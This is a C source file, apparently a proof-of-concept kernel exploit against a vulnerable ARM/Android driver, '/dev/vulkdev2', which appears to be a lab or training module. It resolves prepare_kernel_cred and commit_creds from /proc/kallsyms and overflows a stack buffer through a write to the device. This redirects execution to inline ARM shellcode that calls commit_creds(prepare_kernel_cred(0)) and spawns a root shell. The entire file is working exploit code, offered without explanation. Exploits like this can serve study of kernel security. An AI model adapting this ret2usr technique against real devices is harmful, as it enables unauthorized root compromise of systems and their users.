#include <stdlib.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define VULKDEV_DEVICE "/dev/vulkdev2"
#define BUFF_SIZE 32

unsigned long prepare_kernel_cred = 0;
unsigned long commit_creds = 0;

void payload(void)
{
	printf("exec root shell\n");
	execl("/system/bin/sh", "sh", NULL);
}

void shellcode(void)
{
	asm volatile (
	"	ldr	r3, =prepare_kernel_cred\n"
	"	ldr	r3, [r3]\n"
	"	mov r0, #0\n"
	"	blx r3\n"
	"	ldr	r3, =commit_creds\n"
	"	ldr	r3, [r3]\n"
	"	blx r3\n"
	"	mov r3, #0x10\n"
    "	msr	cpsr_c,r3\n"
    "	ldr	r3, =payload\n"
    "	blx r3\n"
    :
	:
	: "r0", "r3"
	);
}

unsigned long get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy, sym[512];
	int ret = 0;

	f = fopen("/proc/kallsyms", "r");
	if (!f)
		return 0;
  
	while (ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sym);
		if (ret == 0) {
			fscanf(f, "%s\n", sym);
			continue;
		}
		if (!strcmp(name, sym)) {
			printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
			fclose(f);
			return addr;
		}
	}
	fclose(f);
  
	return 0;
}

int main(int argc, char* argv[])
{
	int fd;
	char buf[64];
	void **pc;

	printf("payload = %p\n", payload);
	printf("shellcode = %p\n", shellcode);

	prepare_kernel_cred = get_symbol("prepare_kernel_cred");
	commit_creds = get_symbol("commit_creds");
	if (!prepare_kernel_cred || !commit_creds) {
		printf("get_symbol faild!\n");
		exit(1);
	}

	fd = open(VULKDEV_DEVICE, O_RDWR|O_NONBLOCK);
	if (fd == -1) {
		printf("open vulkdev fail!\n");
		exit(1);
	}

	pc = (void *)&buf[BUFF_SIZE + 4];
	*pc = (void *)shellcode;

	write(fd, buf, 48);
	close(fd);
	return 0;
}

